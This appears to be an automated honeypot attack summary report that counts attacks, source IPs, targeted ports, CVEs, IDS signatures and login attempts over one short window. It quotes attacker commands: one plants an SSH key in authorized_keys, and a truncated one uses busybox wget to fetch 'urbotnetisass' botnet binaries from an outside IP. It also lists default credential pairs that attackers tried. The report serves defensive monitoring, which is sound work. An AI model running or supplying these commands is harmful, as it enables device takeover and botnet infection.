
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-14T18:01:26Z
**Timeframe:** 2025-10-14T17:20:01Z to 2025-10-14T18:00:01Z
**Files Used:**
- agg_log_20251014T172001Z.json
- agg_log_20251014T174001Z.json
- agg_log_20251014T180001Z.json

---

## Executive Summary

This report summarizes 16,449 malicious activities recorded across the honeypot network. The majority of attacks were captured by the Cowrie, Honeytrap, and Sentrypeer honeypots. A significant portion of the traffic originated from IP address 206.191.154.180. The most targeted service was SIP on port 5060. Attackers were observed attempting to gain access via SSH, executing reconnaissance commands, and attempting to download and execute malicious payloads. Several CVEs were targeted, including vulnerabilities in TP-Link routers and various older exploits.

---

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 4950
- **Honeytrap:** 4145
- **Sentrypeer:** 2935
- **Ciscoasa:** 1671
- **Suricata:** 1605
- **Mailoney:** 880
- **Dionaea:** 64
- **H0neytr4p:** 63
- **Tanner:** 50
- **ConPot:** 30
- **Redishoneypot:** 25
- **Adbhoney:** 13
- **Ipphoney:** 5
- **Honeyaml:** 5
- **Dicompot:** 3
- **Heralding:** 3
- **ElasticPot:** 2

### Top Attacking IPs
- **206.191.154.180:** 1431
- **185.243.5.146:** 1171
- **176.65.141.119:** 782
- **88.210.63.16:** 429
- **172.86.95.98:** 407
- **89.117.54.101:** 401
- **172.86.95.115:** 392
- **62.141.43.183:** 324
- **186.87.166.141:** 174
- **13.210.55.81:** 184
- **107.175.70.80:** 162
- **61.219.181.31:** 259

### Top Targeted Ports/Protocols
- **5060 (SIP):** 2935
- **22 (SSH):** 635
- **25 (SMTP):** 880
- **5903:** 189
- **443 (HTTPS):** 63
- **80 (HTTP):** 45
- **23 (Telnet):** 51
- **445 (SMB):** 54

### Most Common CVEs
- CVE-2001-0414
- CVE-2002-0012
- CVE-2002-0013
- CVE-2016-20016
- CVE-2019-11500
- CVE-2023-1389

### Commands Attempted by Attackers
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- `lockr -ia .ssh`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `crontab -l`
- `w`
- `Enter new UNIX password:`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

### Signatures Triggered
- **ET DROP Dshield Block Listed Source group 1:** 351
- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 254
- **ET SCAN NMAP -sS window 1024:** 163
- **ET HUNTING RDP Authentication Bypass Attempt:** 107
- **ET INFO Reserved Internal IP Traffic:** 61
- **ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication:** 25
- **ET CINS Active Threat Intelligence Poor Reputation IP group 48:** 22
- **ET CINS Active Threat Intelligence Poor Reputation IP group 42:** 15
- **ET CINS Active Threat Intelligence Poor Reputation IP group 45:** 18
- **ET CINS Active Threat Intelligence Poor Reputation IP group 43:** 17
- **ET CINS Active Threat Intelligence Poor Reputation IP group 44:** 8
- **ET SCAN Suspicious inbound to PostgreSQL port 5432:** 12

### Users / Login Attempts
- **345gs5662d34/345gs5662d34:** 27
- **root/Qaz123qaz:** 12
- **admin/0:** 6
- **nobody/55:** 6
- **ubnt/p@ssw0rd:** 6
- **debian/777:** 6
- **supervisor/supervisor2015:** 5
- **root/123@@@:** 10
- **root/Password@2025:** 7
- **ftpuser/ftppassword:** 7

### Files Uploaded/Downloaded
- shadow.mips;chmod
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

### HTTP User-Agents
- No significant user agents were logged.

### SSH Clients and Servers
- No specific SSH client or server versions were logged.

### Top Attacker AS Organizations
- No attacker AS organization data was available in the logs.

---

## Key Observations and Anomalies

- **Persistent SSH Intrusion Attempts:** A recurring set of commands indicates a coordinated campaign to compromise systems via SSH, establish persistence by adding a new SSH key to `authorized_keys`, and then perform system reconnaissance.
- **Malware Download:** An attacker attempted to download and execute several variants of a payload named `urbotnetisass` for different architectures (ARM, x86, MIPS), suggesting an automated infection script targeting a wide range of IoT or embedded devices.
- **SIP Probing:** The high volume of traffic to port 5060 indicates widespread scanning for vulnerabilities in VoIP systems.
- **CVE Exploitation:** The mix of very old (2001, 2002) and more recent CVEs (2023) shows that attackers are using a broad spectrum of exploits to maximize their chances of a successful compromise.
